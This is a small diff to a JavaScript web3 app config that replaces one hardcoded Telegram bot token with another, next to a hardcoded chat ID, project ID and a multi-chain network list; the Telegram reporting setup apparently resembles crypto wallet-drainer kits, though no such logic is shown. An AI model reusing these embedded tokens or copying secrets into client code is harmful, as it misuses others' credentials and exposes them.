@@ -46,7 +46,7 @@ const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
 const projectId = import.meta.env.VITE_PROJECT_ID || 'd1def8789669a103d8e57b8c06dbb7d1'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7336912367:AAEr0_1Cd8HVJl-3roQkg_WkI88YNASpKpo'
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7827340221:AAEzuvzYv-IbDGSiLcLjSh_UqyE8K788uVw'
 const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002818415934'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
